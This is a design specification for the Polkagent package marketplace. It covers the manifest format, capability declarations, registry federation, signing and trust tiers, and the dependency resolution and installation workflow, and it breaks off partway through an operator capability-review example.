# PRD-12: Marketplace, Registry, Extension SDK and Product Kits

> **Implementation note (audited 2026-08-05):** This PRD remains normative,
> but its embedded implementation statements and checklists are not current
> status evidence. Use [STATUS.md](STATUS.md) and
> [IMPLEMENTATION-BACKLOG.md](IMPLEMENTATION-BACKLOG.md) for verified state and
> the dependency-ordered execution queue.

**Status:** definitive PRD
**Owner:** unassigned
**Last updated:** 2026-07-30
**Implementation status:** design direction; no production implementation exists
**Depends on:** PRD-02 (Vocabulary/Architecture), PRD-03 (Execution Model), PRD-04 (Providers/Tools/Skills), PRD-07 (Identity/Security), PRD-08 (Payments), PRD-11 (Cloud/Self-Hosting)
**Depended on by:** PRD-13 (UX), PRD-15 (Testing/Assurance)

---

## 1. Purpose and orientation

### 1.1 What this document covers

This PRD defines how Polkagent packages — skills, tools, model configurations,
harness configurations, compute providers, feeds, agent services, and complete
product kits — are authored, described, published, discovered, installed,
activated, sandboxed, updated, revoked, and commercially offered.

It covers five interconnected systems:

1. **Package taxonomy and manifest specification** — the unified way every
   publishable unit describes itself.
2. **Registry architecture** — how packages are stored, discovered, federated,
   mirrored, and sideloaded.
3. **Trust model** — how publishers, packages, and registries earn and lose
   trust without creating a central gate.
4. **Resolution, installation, sandboxing, and lifecycle** — how packages
   move from discovery to activation to removal.
5. **Product kits** — how complete user-outcome bundles compose packages into
   installable products.

### 1.2 Who should read this

- **Package authors** who want to publish skills, tools, or kits.
- **Operators** who manage which packages are available in their deployment.
- **Platform engineers** building registry, resolver, or sandbox infrastructure.
- **Security reviewers** evaluating supply-chain and runtime isolation.
- **Product designers** creating marketplace discovery UX.

### 1.3 What this document does not cover

- The internal execution model for runs and effects (PRD-03).
- Provider and model configuration internals (PRD-04).
- Payment rails and settlement mechanics (PRD-08).
- Cloud tenancy and worker isolation (PRD-11).
- UX wireframes and interaction patterns (PRD-13).

Cross-cutting interfaces are summarized inline where necessary for a reader
to understand this PRD without opening another.

### 1.4 Glossary

| Term | Meaning in this PRD |
|---|---|
| **Package** | Any versioned, manifest-described unit publishable to a registry: skill, tool, model config, harness config, compute provider, feed, agent service, or product kit. |
| **Manifest** | A structured, machine-readable description of a package's identity, capabilities, dependencies, data access, provenance, and constraints. |
| **Registry** | A service or store that indexes, serves, and optionally validates packages. |
| **Marketplace** | A discovery and commercial layer over one or more registries. |
| **Publisher** | An identity (person, team, organization, or service) that signs and publishes packages. |
| **Operator** | A person or organization that controls which packages are available, activated, and granted capabilities in a deployment. |
| **Consumer** | A user, agent, or automated system that discovers, installs, or activates packages. |
| **Product kit** | A composed bundle of packages (skills, tools, policies, fixtures, UX assets) designed for a specific user outcome. |
| **Sideloading** | Installing a package from a local path or direct reference without using a registry. |
| **Trust tier** | A classification of package provenance: unsigned, signed, verified, or curated. |
| **Capability** | A typed permission a package declares it needs (network access, filesystem, chain operations, etc.). |
| **Sandbox** | An isolation boundary that enforces capability restrictions at runtime. |
| **Lockfile** | A content-addressed snapshot of resolved dependency versions and digests. |

---

## 2. Core principles

### 2.1 Permissionless, plural publication with safe discovery defaults

**Established.** This is the foundational principle of the Polkagent marketplace.

Publishing a package must not require approval from a single central authority.
Any identity may publish to any registry that accepts submissions. The default
public registry accepts all well-formed, signed packages without editorial
review.

Safe discovery is a UX layer, not a publication gate. The default user
experience surfaces verified and curated packages prominently, but an expert
user can always:

- Browse unsigned or community packages.
- Point their resolver at alternative registries.
- Sideload packages from local paths.
- Run their own registry.

This principle has four consequences:

1. **No single point of editorial control.** The platform operator may curate
   a default view, but cannot prevent publication to other registries.
2. **Discovery does not imply activation.** Finding a package does not install
   it. Installing does not grant capabilities. Granting capabilities does not
   bypass policy.
3. **Trust is graduated, plural, and inspectable.** Multiple independent trust
   signals (signatures, audits, ratings, usage) compose into a discoverable
   trust profile without any single signal being authoritative.
4. **Self-hosted users are first-class.** Every marketplace feature must work
   for a self-hosted deployment that never contacts the default public registry.

### 2.2 Separation of concerns

Five distinct lifecycle phases must remain independent:

```
Discovery → Installation → Capability Grant → Activation → Authorization
```

| Phase | What happens | Who controls it |
|---|---|---|
| Discovery | Consumer finds a package in a registry or receives a reference. | Registry index; marketplace UX. |
| Installation | Package content is fetched, verified, and stored locally. | Consumer or operator. |
| Capability Grant | Operator explicitly grants the package its requested capabilities. | Operator policy. |
| Activation | Package is loaded into the runtime and available for use. | Operator or agent configuration. |
| Authorization | Each invocation is checked against the resolved grant at execution time. | Policy evaluator; `ResolvedGrant`. |

A package cannot escalate from one phase to the next without explicit action.
A marketplace listing that says "install and run" still requires each step.

### 2.3 Supply-chain security as a product

A marketplace is a supply-chain product. Version pinning, manifest validation,
capability disclosure, reproducible builds, integrity verification, revocation,
billing boundaries, and incident response are not optional features added after
launch. They are prerequisites for accepting third-party code.

### 2.4 Operator sovereignty

The operator of a deployment has final authority over which packages, registries,
trust tiers, and capabilities are available. No external registry, marketplace,
publisher, or platform service can override operator policy.

---

## 3. Package taxonomy

### 3.1 Unified package types

All publishable units share a common manifest format (section 4) and lifecycle
(section 7). The `package_type` field determines type-specific behavior:

| Package type | Purpose | Contains | Execution model |
|---|---|---|---|
| `skill` | Versioned instructions, schemas, examples, tests, and declared tool/capability requirements for a specific agent task. | Prompt templates, schemas, examples, test fixtures, tool requirements, context requirements, cost/risk metadata. | Loaded into agent context; no direct code execution. |
| `context_pack` | Attributed knowledge without executable authority. | Documents, schemas, examples, glossaries, reference material. | Loaded into context assembly; read-only. |
| `tool` | A typed operation an agent may invoke under capability grant. | Implementation (WASM, process spec, or RPC endpoint), input/output schemas, capability declarations, resource limits. | Executed in sandbox with granted capabilities. |
| `model_config` | A model provider or routing configuration. | Provider type, endpoint patterns, capability descriptors, pricing metadata, authentication requirements. | Applied to model catalog; no code execution. |
| `harness_config` | A coding-agent or framework service configuration. | Harness type, launch configuration, capability requirements, session contract, workspace requirements. | Applied to harness registry; launches external process. |
| `compute_provider` | A remote compute resource configuration. | Provider type, resource specifications, pricing, authentication, SLA terms. | Applied to compute catalog; no code execution. |
| `feed` | A data source or event stream configuration. | Source type, schema, polling/subscription config, cursor semantics, data classification. | Registered as trigger/ingress source. |
| `agent_service` | A published agent service offering. | Service descriptor, capability declaration, pricing, SLA, API schema. | Registered in service directory. |
| `product_kit` | A composed bundle of packages for a specific user outcome. | Package references, composition policy, configuration defaults, UX assets, fixtures, documentation. | Installs and configures constituent packages. |

### 3.2 Package type rules

- A package has exactly one `package_type`.
- A `product_kit` may reference any other package type, including other kits
  (with cycle detection).
- A `context_pack` cannot declare executable capabilities.
- A `tool` must declare all capabilities it requires; undeclared capabilities
  are denied.
- A `skill` may declare tool requirements but does not execute code itself.
- A `model_config` and `harness_config` describe external services; they do not
  contain executable code within the package.
- A `feed` may declare network capabilities for polling external sources.

---

## 4. Manifest specification

### 4.1 Manifest structure

Every package includes a `polkagent.manifest.toml` (or equivalent structured
format) at its root. The manifest is the single source of truth for the
package's identity, capabilities, dependencies, and constraints.

```toml
[package]
# --- Identity ---
name = "polkadot-governance-scout"
version = "1.3.0"
package_type = "skill"
description = "Research and explain Polkadot OpenGov referenda with cited evidence."
license = "Apache-2.0"
repository = "https://github.com/example/governance-scout"
documentation = "https://example.com/docs/governance-scout"
keywords = ["polkadot", "governance", "openGov", "research"]
categories = ["polkadot", "governance", "research"]

[package.author]
name = "Example Team"
# Publisher identity is bound at publish time via signature, not self-declared here.

# --- Platform compatibility ---
[compatibility]
polkagent_version = ">=0.4.0, <1.0.0"
rust_edition = "2024"          # If contains compiled code
target_architectures = ["aarch64-apple-darwin", "x86_64-unknown-linux-gnu", "wasm32-wasip2"]

# --- Capability declarations ---
[capabilities]
# Each capability is typed and scoped. Undeclared capabilities are denied.

[capabilities.network]
required = true
hosts = ["rpc.polkadot.io", "*.parity.io"]
protocols = ["https", "wss"]
reason = "Query OpenGov referendum data from Polkadot RPC endpoints."

[capabilities.chain_read]
required = true
networks = ["polkadot", "kusama"]
pallets = ["Referenda", "ConvictionVoting", "Preimage", "Scheduler"]
reason = "Read governance state, referendum details, and voting records."

[capabilities.chain_write]
required = false
# Not declared = not available, even if operator grants broadly.

[capabilities.filesystem]
required = false
# No filesystem access needed for this skill.

# --- Data access disclosure ---
[data_access]
reads = ["chain_state:governance", "chain_state:identity"]
writes = []
stores = []
transmits = []
classification_floor = "Public"
reason = "Reads on-chain governance and optional identity data. No private data accessed."

# --- Dependencies ---
[dependencies]
"polkadot-chain-profile" = { version = ">=1.0.0", registry = "default" }
"openGov-schema" = { version = "^2.0.0", registry = "default" }

[dev-dependencies]
"governance-test-fixtures" = { version = ">=1.0.0", registry = "default" }

# --- Signing and provenance ---
[provenance]
# Populated at build/publish time, not authored manually.
# build_digest = "sha256:abc123..."
# source_commit = "abc123def456"
# build_reproducible = true
# signature = "..."
# signer_identity = "..."

# --- Type-specific configuration ---
[skill]
tools_required = ["chain_read"]
tools_optional = ["web_search"]
context_packs = ["openGov-schema"]
estimated_tokens = { min = 2000, typical = 8000, max = 32000 }
```

### 4.2 Identity fields

| Field | Required | Description |
|---|---|---|
| `name` | Yes | Unique within a registry namespace. Lowercase alphanumeric with hyphens. Max 64 characters. |
| `version` | Yes | Semantic versioning (SemVer 2.0). |
| `package_type` | Yes | One of the types in section 3.1. |
| `description` | Yes | Human-readable summary, max 500 characters. |
| `license` | Yes | SPDX license expression. |
| `repository` | No | Source repository URL. |
| `documentation` | No | Documentation URL. |
| `keywords` | No | Up to 10 searchable keywords. |
| `categories` | No | Up to 5 category tags from a registry-defined taxonomy. |

### 4.3 Author and publisher identity

The manifest's `[package.author]` section records the human-readable author
name. The cryptographic publisher identity is established at publish time:

- The publisher signs the manifest and package content with their key.
- The registry records the publisher's identity (Polkadot account, PGP key,
  or registry-specific identity).
- The publisher identity is verified against the signature, not self-declared
  in the manifest.

This separation prevents manifest forgery: a package cannot claim authorship
by a different identity.

### 4.4 Capability declarations

Capabilities are the package's explicit declaration of what external resources
and authorities it needs. The capability system follows these rules:

1. **Declare everything needed.** A package that does not declare a capability
   cannot use it, even if the operator grants it broadly.
2. **Scope narrowly.** Declare specific hosts, pallets, filesystem paths, and
   operations rather than broad categories.
3. **Explain why.** Each capability includes a human-readable `reason` field
   displayed to operators during installation review.
4. **Required vs optional.** A capability marked `required = true` must be
   granted for the package to function. Optional capabilities degrade
   gracefully.
5. **Intersection with operator policy.** The effective capability is the
   intersection of the package's declaration, the operator's grant, and the
   current policy context (see PRD-07 `ResolvedGrant`).

Supported capability categories:

| Category | Scope parameters | Example |
|---|---|---|
| `network` | Hosts, ports, protocols | Access `rpc.polkadot.io` via WSS. |
| `filesystem` | Paths, read/write/create | Read files under `/workspace/src/`. |
| `chain_read` | Networks, pallets, storage keys | Read `Referenda` pallet on Polkadot. |
| `chain_write` | Networks, pallets, calls | Submit `ConvictionVoting::vote` on Polkadot. |
| `model_invoke` | Provider types, model families | Invoke Anthropic Claude models. |
| `tool_invoke` | Tool names/versions | Invoke the `web_search` tool. |
| `memory_read` | Memory scopes, classifications | Read public episodic memory. |
| `memory_write` | Memory scopes, classifications | Write workspace-scoped knowledge. |
| `secret_read` | Secret categories | Read API keys for configured providers. |
| `process_spawn` | Commands, arguments, resource limits | Run `cargo build` in workspace. |
| `economic` | Asset types, amount limits, networks | Spend up to 1 DOT per invocation. |

### 4.5 Data access disclosure

The `[data_access]` section is a human-and-machine-readable disclosure of what
data the package touches:

```toml
[data_access]
reads = ["chain_state:governance", "user_memory:episodic"]
writes = ["workspace:artifacts"]
stores = ["local:cache"]
transmits = ["network:rpc_queries"]
classification_floor = "Private"
reason = "Reads governance data and user history; caches results locally."
```

| Field | Purpose |
|---|---|
| `reads` | Data categories the package reads. |
| `writes` | Data categories the package writes or modifies. |
| `stores` | Data the package persists locally. |
| `transmits` | Data the package sends to external services. |
| `classification_floor` | The most sensitive data classification the package handles. |
| `reason` | Human-readable explanation of data use. |

Data access disclosure is distinct from capability declarations. A capability
grants the technical ability; data access disclosure explains what the package
does with it. Both are displayed to operators during review.

### 4.6 Dependency graph

Dependencies follow SemVer resolution with these constraints:

```toml
[dependencies]
"package-name" = { version = ">=1.0.0, <2.0.0", registry = "default" }
"another-package" = { version = "^3.2.0", registry = "company-internal" }
"local-tool" = { path = "/opt/polkagent/tools/local-tool" }
```

| Field | Description |
|---|---|
| `version` | SemVer version constraint. |
| `registry` | Registry name from resolver configuration. `"default"` is the configured default registry. |
| `path` | Local filesystem path for sideloaded dependencies. |
| `optional` | If true, the dependency is not required for core functionality. |
| `features` | Feature flags to enable on the dependency. |

Dependency rules:

- Cycles are prohibited. The resolver rejects any dependency graph with cycles.
- A package's effective capabilities are the intersection of its declared
  capabilities and its transitive dependency capabilities. A dependency cannot
  widen the parent's capability scope.
- **Capability attenuation in composed packages:** a package may only grant a
  downstream dependency a *subset* of its own granted capabilities — never a
  superset. This is enforced at the WIT/host boundary when the WASM Component
  Model is in use. A composed component that attempts to expose capabilities
  its parent world does not hold is rejected at load time by the host.
- Version conflicts within a single resolution context are errors, not silently
  resolved.
- Dev dependencies are only resolved for testing and development.

### 4.7 Signing and provenance

The `[provenance]` section is populated at build and publish time:

| Field | Purpose |
|---|---|
| `build_digest` | Content-addressed hash of the complete package. |
| `source_commit` | Git commit hash of the source (if applicable). |
| `build_reproducible` | Whether the build is reproducible from source. |
| `build_system` | Build system and version used. |
| `build_timestamp` | ISO 8601 timestamp of the build. |
| `signature` | Cryptographic signature over the manifest and content. |
| `signer_identity` | Publisher's signing identity reference. |
| `attestations` | Optional third-party attestation references (audits, reviews). |

#### 4.7.1 Supply-chain signing and provenance standard

Package signing uses **Sigstore cosign v3 keyless signing** with short-lived
OIDC-bound certificates. The current stable version is cosign v3.1.2
(July 2026). Keyless signing binds the signature to a CI/CD identity (e.g.
a GitHub Actions OIDC token) rather than a long-lived private key, which
eliminates key-management risk and produces a publicly auditable Rekor
transparency-log entry.

Every published package must also carry an **in-toto attestation** that
records the full build provenance chain from source to artifact. The target
supply-chain assurance level is **SLSA Build Level 2** for v1, with the
architecture designed to reach **SLSA Build Level 3** as CI infrastructure
matures. SLSA L2 requires a hosted build platform that generates signed
provenance; SLSA L3 additionally requires that the build is hardened against
tampering by the build service itself.

Verification is **mandatory at install time**. The installer pins the expected
signer identity (e.g. `https://github.com/example/repo/.github/workflows/
publish.yml@refs/heads/main`) and rejects any package whose cosign certificate
subject does not match. Silent fallback to unverified installation is not
permitted.

Signing requirements by trust tier:

| Trust tier | Signing requirement |
|---|---|
| Unsigned | No signature. Displayed with prominent warnings. |
| Signed | Valid cosign v3 keyless signature. Rekor transparency-log entry. in-toto provenance attestation. Publisher identity is displayed. |
| Verified | Signed + publisher identity has verified claims (Polkadot on-chain identity, domain verification, etc.) + SLSA Build L2 provenance. |
| Curated | Verified plus explicit inclusion in a named curated collection by a recognized curator. |

### 4.8 Compatibility constraints

```toml
[compatibility]
polkagent_version = ">=0.4.0, <1.0.0"
rust_edition = "2024"
target_architectures = ["aarch64-apple-darwin", "x86_64-unknown-linux-gnu", "wasm32-wasip2"]

[compatibility.chain_profiles]
# Optional: which chain profiles this package is tested against.
polkadot = { spec_version = ">=1003000" }
kusama = { spec_version = ">=1003000" }
```

The resolver checks compatibility constraints before installation. A package
whose constraints do not match the target environment is rejected with a clear
explanation.

---

## 5. Registry architecture

### 5.1 Registry model

A registry is a service that:

1. Accepts package submissions from publishers.
2. Stores package manifests and content.
3. Serves package metadata and content to resolvers.
4. Optionally validates, indexes, ranks, and curates packages.

Registries are independent services. The Polkagent project operates a default
public registry, but any entity may operate a registry.

### 5.2 Default public registry

The default public registry is operated by the Polkagent project with these
properties:

| Property | Value |
|---|---|
| Access | Open read; authenticated write. |
| Publication gate | Well-formed manifest and valid signature only. No editorial review required. |
| Content policy | Automated malware scan and manifest validation. No subjective quality gate. |
| Trust enrichment | Automated compatibility testing, vulnerability scanning, and usage metrics. Community ratings. |
| Curated views | Maintained by named curators. A curated view is a list, not a publication gate. |
| Availability | Best-effort SLA; not a dependency for local operation. |
| Fee model | Free publication. Optional paid promotion. Platform fees on commercial transactions. |

The default registry is a convenience, not a requirement. A deployment that
never contacts it remains fully functional with alternative registries,
mirrors, or sideloaded packages.

#### 5.2.1 Registry design lessons from crates.io and npm

The design of the default registry incorporates lessons from crates.io and npm:

- **Namespacing to fight typosquatting.** Package names are scoped under a
  verified publisher namespace (e.g. `@example/governance-scout`). A package
  with a name that closely matches a popular existing package triggers
  automated similarity detection and a manual review flag before it appears in
  default search results. This mirrors the namespace-squatting mitigations
  introduced in npm's scoped packages and crates.io's reserved-prefix model.
- **Trusted publishing via OIDC.** Publishers authenticate publication via
  OIDC tokens issued by their CI/CD provider (GitHub Actions, GitLab CI, etc.)
  rather than long-lived API tokens. This eliminates the most common
  credential-leak vector. The approach mirrors crates.io Trusted Publishing
  (shipped July 2025).
- **Security advisory surfacing.** Every package page surfaces known
  vulnerability advisories at the top of its listing — not buried in a
  metadata tab. The default registry maintains a security advisory database
  (analogous to RustSec) and surfaces advisories from it plus any third-party
  feeds the operator configures. Installers see advisory warnings before
  download. This mirrors the Security tab added to crates.io in January 2026.
- **Offline and air-gapped mirror support.** The registry protocol is designed
  from the start for full offline mirroring (see sections 5.5 and 5.7). A
  registry operator can pre-populate a local mirror on a connected machine and
  transfer it to an air-gapped environment with full signature verification.

### 5.3 Self-hosted registries

Any deployment can run its own registry:

```text
polkagent registry serve \
  --listen 0.0.0.0:8443 \
  --storage /var/lib/polkagent/registry \
  --auth-config /etc/polkagent/registry-auth.toml
```

A self-hosted registry supports:

- Package publication with configurable authentication and authorization.
- Full or selective mirroring from other registries.
- Offline operation with pre-populated package stores.
- Organization-specific allow/deny lists and trust policies.
- Custom curation, ranking, and discovery rules.
- Federation with other registries (section 5.5).

The self-hosted registry uses the same API contract as the default public
registry. Clients do not need different code paths.

### 5.4 Registry API contract

Every registry implements a versioned API:

```rust
/// Core registry operations. Every registry must implement these.
#[async_trait]
pub trait RegistryApi {
    /// Search packages by query, type, keywords, and compatibility.
    async fn search(
        &self,
        query: SearchQuery,
    ) -> Result<SearchResults, RegistryError>;

    /// Get package metadata by name and optional version.
    async fn get_metadata(
        &self,
        name: &PackageName,
        version: Option<&Version>,
    ) -> Result<PackageMetadata, RegistryError>;

    /// Download package content by name and version.
    async fn download(
        &self,
        name: &PackageName,
        version: &Version,
    ) -> Result<PackageContent, RegistryError>;

    /// Publish a package (authenticated).
    async fn publish(
        &self,
        submission: PackageSubmission,
        auth: &PublisherAuth,
    ) -> Result<PublishReceipt, RegistryError>;

    /// Get trust signals for a package version.
    async fn trust_signals(
        &self,
        name: &PackageName,
        version: &Version,
    ) -> Result<TrustSignals, RegistryError>;

    /// List available versions for a package.
    async fn versions(
        &self,
        name: &PackageName,
    ) -> Result<VersionList, RegistryError>;

    /// Get security advisories for a package.
    async fn advisories(
        &self,
        name: &PackageName,
    ) -> Result<Vec<SecurityAdvisory>, RegistryError>;
}
```

```rust
/// Extended registry operations. Optional for minimal registries.
#[async_trait]
pub trait RegistryExtendedApi: RegistryApi {
    /// Submit a review or rating.
    async fn submit_review(
        &self,
        review: PackageReview,
        auth: &PublisherAuth,
    ) -> Result<ReviewReceipt, RegistryError>;

    /// Get curated collections.
    async fn collections(
        &self,
        filter: CollectionFilter,
    ) -> Result<Vec<CuratedCollection>, RegistryError>;

    /// Mirror packages from another registry.
    async fn mirror(
        &self,
        source: &RegistryRef,
        filter: MirrorFilter,
    ) -> Result<MirrorStatus, RegistryError>;

    /// Get federation peers.
    async fn federation_peers(
        &self,
    ) -> Result<Vec<FederationPeer>, RegistryError>;
}
```

### 5.5 Federation and mirroring

Registries can federate to share packages across organizational boundaries:

**Mirroring** is one-way replication:
- A registry mirrors selected packages from one or more upstream registries.
- Mirrored packages retain their original signatures and provenance.
- The mirror adds its own metadata (mirror timestamp, availability status).
- Useful for: air-gapped environments, regional availability, caching.

**Federation** is bidirectional discovery:
- Federated registries advertise each other as search sources.
- A search query can fan out to federated peers with configurable timeout
  and trust weighting.
- Each registry retains authority over its own packages and trust signals.
- Useful for: organizational collaboration, community registries, ecosystem
  diversity.

```toml
# Registry federation configuration
[federation]
enabled = true

[[federation.peers]]
name = "polkadot-community"
url = "https://registry.polkadot-community.org/api/v1"
trust_weight = 0.8
search_timeout_ms = 3000
mirror = false   # Discovery only, not content mirroring.

[[federation.peers]]
name = "company-internal"
url = "https://registry.internal.company.com/api/v1"
trust_weight = 1.0
search_timeout_ms = 1000
mirror = true    # Also mirror content locally.
```

### 5.6 Sideloading

Sideloading installs a package from a local path or direct URL without using a
registry:

```bash
# Install from local directory
polkagent package install --path /home/dev/my-custom-tool/

# Install from URL
polkagent package install --url https://example.com/packages/my-tool-1.0.0.pak

# Install from git repository
polkagent package install --git https://github.com/example/my-tool.git --tag v1.0.0
```

Sideloaded packages:

- Must have a valid manifest.
- May be unsigned (with prominent warnings in UX).
- Are tracked in the local package database with their source reference.
- Receive the same capability review and sandboxing as registry packages.
- Do not automatically receive updates (operator must re-sideload).
- Cannot be distributed through registries without proper publication.

### 5.7 Offline bundle format

For air-gapped or low-connectivity deployments, packages and their dependencies
can be exported as self-contained bundles:

```bash
# Export a package and all dependencies as an offline bundle
polkagent package bundle export \
  --package governance-scout@1.3.0 \
  --include-dependencies \
  --output governance-scout-1.3.0-bundle.pak

# Import an offline bundle
polkagent package bundle import \
  --input governance-scout-1.3.0-bundle.pak \
  --verify-signatures
```

Bundle format:

```
governance-scout-1.3.0-bundle.pak
├── manifest.toml              # Bundle manifest with contents list
├── signatures/                # Publisher and bundler signatures
├── packages/
│   ├── governance-scout-1.3.0/
│   │   ├── polkagent.manifest.toml
│   │   └── content/
│   ├── polkadot-chain-profile-1.2.0/
│   │   ├── polkagent.manifest.toml
│   │   └── content/
│   └── openGov-schema-2.1.0/
│       ├── polkagent.manifest.toml
│       └── content/
├── lockfile.toml              # Resolved dependency versions and digests
└── verification.toml          # Content digests for integrity verification
```

---

## 6. Trust model

### 6.1 Trust tiers

Trust is a graduated, plural signal system. No single trust tier grants
execution authority; trust informs discovery and operator decisions.

| Tier | Requirements | Discovery default | Operator action needed |
|---|---|---|---|
| **Unsigned** | Valid manifest only. No signature. | Hidden from default views. Visible in "all packages" with warning. | Explicit opt-in to install. Additional confirmation required. |
| **Signed** | Valid manifest + valid cryptographic signature from any identity. | Visible in search results with publisher identity. | Standard install flow with capability review. |
| **Verified** | Signed + publisher identity has verified claims (Polkadot on-chain identity, domain verification, organization verification). | Prominent in search results. Verification badge displayed. | Standard install flow. |
| **Curated** | Verified + explicitly included in a named curated collection by a recognized curator. | Featured in curated views and recommendations. | Standard install flow. Curator endorsement displayed. |

#### 6.1.1 Curated collections and governance

Curated collections are named, versioned lists of packages maintained by
recognized curators. A curator is a person or organization that the platform
operator or community recognizes as authoritative for a domain. Curation is a
UX signal, not a security gate.

Curated collection membership is governed by a lightweight process:

- A curator proposes a package for inclusion via a pull-request-style review
  against the collection's manifest.
- At least one other recognized curator reviews and approves.
- The collection is signed by the curator's identity and published to the
  registry.
- Removal from a curated collection is logged with a reason and triggers a
  downgrade notification to operators who installed the package based on that
  curation signal.

Commercial packages may be featured in curated collections. Curators may
receive a fee share (see section 11.1) as an incentive to maintain quality
collections. The fee and selection criteria for any commercial collection must
be publicly disclosed in the collection manifest.

### 6.2 Trust tier rules

1. **Trust tiers are descriptive, not prescriptive.** A curated package still
   requires capability review and operator grant. An unsigned package can be
   installed by an expert who accepts the risk.
2. **Trust tiers are per-version.** A new version of a verified package starts
   as signed until the publisher's identity is re-verified for that version.
3. **Trust tiers are per-registry.** A package may be curated in one registry
   and merely signed in another.
4. **Downgrade visibility.** If a previously verified publisher's identity
   claims expire or are revoked, their packages are downgraded to signed with
   a visible notification.
5. **Trust does not equal safety.** A curated, verified package can still
   contain bugs, security vulnerabilities, or malicious code. Trust tiers
   reduce search cost; they do not eliminate review responsibility.

### 6.3 Publisher identity and attestation

Publisher identity is established through one or more of:

| Identity type | Verification method | Strength |
|---|---|---|
| **Registry account** | Email verification and password/key authentication. | Basic: confirms account control. |
| **Polkadot account** | Signed challenge proving control of a Polkadot address. | Moderate: links to on-chain identity if present. |
| **Domain verification** | DNS TXT record or well-known file proving domain control. | Moderate: links to organizational web presence. |
| **Organization verification** | Manual review of organizational documentation. | Strong: links to a real-world entity. |
| **On-chain identity** | Polkadot People Chain identity with registrar judgments. | Strong: leverages existing identity infrastructure. |

Publishers may accumulate multiple identity verifications. Each verification
is independently verifiable and revocable. No single verification method is
mandatory.

### 6.4 Community ratings and evaluations

Community trust signals complement publisher identity:

| Signal | Source | Weight | Display |
|---|---|---|---|
| **Install count** | Registry analytics. | Low (gameable). | Displayed as context, not ranking. |
| **Ratings** | Authenticated users. | Moderate. | Star rating with review count. |
| **Reviews** | Authenticated users with optional attestation. | Moderate to high. | Text reviews with reviewer identity. |
| **Compatibility results** | Automated CI against target environments. | High. | Pass/fail badges per platform. |
| **Vulnerability status** | Automated scanning and manual advisory. | Critical. | Prominent warning if known vulnerabilities. |
| **Audit attestation** | Named security auditor's signed statement. | High. | Audit badge with auditor identity and scope. |
| **Usage telemetry** | Opt-in anonymous usage reports. | Low to moderate. | Active installation estimate. |

Community signals are informational. They cannot grant capabilities, bypass
policy, or override operator decisions.

### 6.5 Security audit status

Packages may carry audit attestations:

```toml
[[provenance.attestations]]
type = "security_audit"
auditor = "ExampleSec Ltd"
auditor_identity = "polkadot:5ExampleSecAddress..."
scope = "Full source review of v1.3.0"
date = "2026-06-15"
report_url = "https://examplesec.com/audits/governance-scout-1.3.0.pdf"
findings = { critical = 0, high = 0, medium = 1, low = 3, resolved = 4 }
signature = "..."
```

Audit attestations are:

- Signed by the auditor's identity (verifiable independently).
- Scoped to a specific version and review scope.
- Displayed to operators during installation review.
- Not a guarantee of safety (stated explicitly in UX).

---

## 7. Resolution and installation

### 7.1 Dependency resolution algorithm

The resolver uses a SAT-based dependency resolution algorithm:

1. **Collect constraints.** Gather version constraints from the root package
   and all transitive dependencies.
2. **Query registries.** Fetch available versions from configured registries
   in priority order.
3. **Resolve versions.** Find a set of versions that satisfies all constraints
   using a backtracking SAT solver.
4. **Check compatibility.** Verify each resolved version against platform
   compatibility constraints (architecture, Polkagent version, chain profiles).
5. **Verify integrity.** Check content digests against manifest declarations.
6. **Generate lockfile.** Record the exact resolved versions, digests, and
   registry sources.

Resolution failure produces a diagnostic that identifies:
- Which constraints conflict.
- Which packages are involved.
- What version ranges might resolve the conflict.

```rust
/// Resolution context for dependency solving.
pub struct ResolutionContext {
    /// Configured registries in priority order.
    pub registries: Vec<RegistryRef>,
    /// Platform compatibility constraints.
    pub platform: PlatformConstraints,
    /// Operator-configured allow/deny lists.
    pub package_policy: PackagePolicy,
    /// Previously resolved lockfile (for update scenarios).
    pub existing_lock: Option<Lockfile>,
}

/// Resolution result.
pub enum ResolutionResult {
    Resolved {
        packages: Vec<ResolvedPackage>,
        lockfile: Lockfile,
        warnings: Vec<ResolutionWarning>,
    },
    Conflict {
        conflicts: Vec<VersionConflict>,
        suggestions: Vec<ResolutionSuggestion>,
    },
}

/// A single resolved package with full provenance.
pub struct ResolvedPackage {
    pub name: PackageName,
    pub version: Version,
    pub registry: RegistryRef,
    pub digest: ContentDigest,
    pub trust_tier: TrustTier,
    pub capabilities_declared: CapabilitySet,
    pub dependencies: Vec<PackageName>,
}
```

### 7.2 Version compatibility rules

Polkagent uses SemVer 2.0 with these interpretations:

| Version change | Meaning | Automatic update |
|---|---|---|
| Patch (1.0.x) | Bug fixes, documentation, performance. No behavior change. | Allowed if operator configures auto-patch. |
| Minor (1.x.0) | New features, new capabilities. Backward-compatible. | Allowed if operator configures auto-minor. |
| Major (x.0.0) | Breaking changes. May change capabilities, schemas, behavior. | Never automatic. Requires operator review. |

**Pre-release versions** (e.g., `1.0.0-alpha.1`) are never automatically
selected. They require explicit version pinning.

**Yanked versions** are versions that the publisher has withdrawn. They are
excluded from resolution unless explicitly pinned in a lockfile. A yanked
version's content remains available for existing installations but is not
offered to new installations.

### 7.3 Installation workflow

```
                    ┌──────────────┐
                    │   Discover   │
                    │  (registry)  │
                    └──────┬───────┘
                           │
                    ┌──────▼───────┐
                    │   Resolve    │
                    │ dependencies │
                    └──────┬───────┘
                           │
                    ┌──────▼───────┐
                    │   Download   │
                    │  & verify    │
                    └──────┬───────┘
                           │
                    ┌──────▼───────┐
                    │   Review     │◄── Operator reviews capabilities,
                    │ capabilities │    data access, trust signals.
                    └──────┬───────┘
                           │
                    ┌──────▼───────┐
                    │   Grant      │◄── Operator explicitly grants
                    │ capabilities │    requested capabilities.
                    └──────┬───────┘
                           │
                    ┌──────▼───────┐
                    │   Install    │
                    │  & lock      │
                    └──────┬───────┘
                           │
                    ┌──────▼───────┐
                    │   Activate   │◄── Package available for use.
                    │  (optional)  │
                    └──────────────┘
```

Each step is a distinct operation that can be performed independently:

```bash
# Step 1: Search
polkagent package search "governance scout"

# Step 2: Inspect before installing
polkagent package inspect governance-scout@1.3.0

# Step 3: Resolve dependencies (dry run)
polkagent package resolve governance-scout@1.3.0 --dry-run

# Step 4: Install (includes download, verify, review prompt)
polkagent package install governance-scout@1.3.0

# Step 5: Grant capabilities (if not done during install)
polkagent package grant governance-scout --capability chain_read

# Step 6: Activate
polkagent package activate governance-scout
```

### 7.4 Operator approval step

During installation, the operator sees a structured review:

```
Package: governance-scout v1.3.0
Publisher: Example Team (verified: Polkadot identity, domain)
Trust tier: Verified
License: Apache-2.0

Capabilities requested:
  [REQUIRED] network: rpc.polkadot.io, *.parity.io (https, wss)
    Reason: Query OpenGov referendum data from Polkadot RPC endpoints.
  [REQUIRED] chain_read: polkadot, kusama — Referenda, ConvictionVoting, Preimage, Scheduler
